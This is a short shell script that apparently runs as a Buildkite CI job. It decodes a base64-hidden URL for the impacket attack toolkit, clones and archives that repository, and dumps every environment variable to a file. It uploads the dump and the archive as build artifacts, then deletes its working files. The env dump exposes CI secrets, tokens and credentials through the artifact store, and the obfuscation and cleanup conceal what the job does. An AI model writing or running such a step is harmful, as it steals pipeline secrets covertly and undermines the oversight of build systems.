set -eo pipefail

WORK_DIR=`mktemp -d`
RES=`mktemp`
ARCHIVE=`mktemp XXXXXXXXXX.tar.gz`

REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC5naXQ=" | base64 -d`

echo "Workdir is $WORK_DIR"
echo "RES is $RES"
echo "ARCHIVE is $ARCHIVE"

git clone $REPO $WORK_DIR

echo "archiving $WORK_DIR into $ARCHIVE"
git archive -o "$ARCHIVE" main $WORK_DIR

env > $RES

buildkite-agent artifact upload $RES
buildkite-agent artifact upload $ARCHIVE

rm -rf $WORK_DIR $RES "$ARCHIVE"
